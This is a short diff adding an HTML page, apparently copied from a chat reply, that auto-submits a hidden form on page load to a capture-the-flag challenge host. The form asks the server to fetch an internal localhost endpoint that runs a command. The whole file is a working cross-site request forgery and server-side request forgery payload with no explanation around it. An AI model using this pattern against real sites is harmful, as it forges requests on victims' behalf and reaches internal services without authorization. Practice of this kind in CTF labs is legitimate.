@@ -1,0 +1,12 @@
+html
+Copy code
+<!DOCTYPE html>
+<html>
+<body onload="document.forms[0].submit()">
+  <form action="http://chal7.hackademy.ctf/demo.php" method="POST">
+    <input type="hidden" name="url" value="http://localhost/api.php?run=ping">
+    <input type="hidden" name="method" value="GET">
+    <input type="hidden" name="postparams" value="">
+  </form>
+</body>
+</html>
